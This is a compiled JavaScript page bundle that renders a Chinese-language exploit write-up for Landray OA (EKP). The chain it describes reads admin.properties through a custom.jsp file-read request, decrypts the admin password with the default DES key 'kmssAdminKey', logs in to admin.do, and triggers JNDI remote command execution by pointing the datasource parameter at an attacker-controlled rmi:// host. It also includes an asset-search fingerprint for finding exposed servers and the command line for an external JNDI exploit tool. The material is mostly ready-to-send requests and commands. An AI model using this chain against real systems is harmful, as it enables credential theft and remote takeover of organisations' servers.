(window.webpackJsonp=window.webpackJsonp||[]).push([[124],{1741:function(s,a,t){s.exports=t.p+"assets/img/lanling-4.3acfa819.png"},1742:function(s,a,t){s.exports=t.p+"assets/img/lanling-5.32e03505.png"},1743:function(s,a,t){s.exports=t.p+"assets/img/lanling-6.bb4f7df1.png"},1744:function(s,a,t){s.exports=t.p+"assets/img/lanling-7.c9a8bb8b.png"},3019:function(s,a,t){"use strict";t.r(a);var n=t(64),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"蓝凌oa-admin-do-jndi远程命令执行"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#蓝凌oa-admin-do-jndi远程命令执行"}},[s._v("#")]),s._v(" 蓝凌OA admin.do JNDI远程命令执行")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息，读取配置文件得到密钥后访问 admin.do 即可利用 JNDI远程命令执行获取权限")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("蓝凌OA")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('app="Landray-OA系统"')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("利用 "),a("code",[s._v("蓝凌OA custom.jsp 任意文件读取漏洞")]),s._v(" 读取配置文件")]),s._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[s._v("/WEB-INF/KmssConfig/admin.properties\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("发送请求包")]),s._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[s._v('POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1\nHost: \nUser-Agent: Go-http-client/1.1\nContent-Length: 60\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n\nvar={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1741),alt:"img"}})]),s._v(" "),a("p",[s._v("获取password后，使用 DES方法 解密，默认密钥为 "),a("code",[s._v("kmssAdminKey")])]),s._v(" "),a("p",[a("img",{attrs:{src:t(1742),alt:"img"}})]),s._v(" "),a("p",[s._v("访问后台地址使用解密的密码登录")]),s._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[s._v("http://xxx.xxx.xxx.xxx/admin.do\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1743),alt:"img"}})]),s._v(" "),a("a-alert",{attrs:{type:"success",message:"使用工具执行命令: https://github.com/welk1n/JNDI-Injection-Exploit",description:"",showIcon:""}}),s._v(" "),a("br"),s._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[s._v("java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("运行工具监听端口 ping dnslog测试 命令执行 (蓝凌OA 默认使用的是 JDK 1.7)")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("POST /admin.do HTTP/1.1\nHost: \nCookie: "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("JSESSIONID")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("90EA764774514A566C480E9726BB3D3F"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Hm_lvt_9838edd365000f753ebfdc508bf832d3")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1620456866")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Hm_lpvt_9838edd365000f753ebfdc508bf832d3")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1620459967")]),s._v("\nContent-Length: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("70")]),s._v("\nCache-Control: max-age"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nSec-Ch-Ua: "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('" Not A;Brand"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("v")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"99"')]),s._v(", "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Chromium"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("v")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"90"')]),s._v(", "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Google Chrome"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("v")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"90"')]),s._v("\nSec-Ch-Ua-Mobile: ?0\nUpgrade-Insecure-Requests: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\nUser-Agent: Mozilla/5.0 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Windows NT "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Win64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" x64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" AppleWebKit/537.36 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("KHTML, like Gecko"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Chrome/90.0.4430.93 Safari/537.36\nOrigin: \nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("q")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.9")]),s._v(",image/avif,image/webp,image/apng,*/*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("q")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.8")]),s._v(",application/signed-exchange"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("v")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("b3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("q")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.9")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("method")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("testDbConn"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("datasource")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("rmi://xxx.xxx.xxx.xxx:1099/cbdsdg\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1744),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);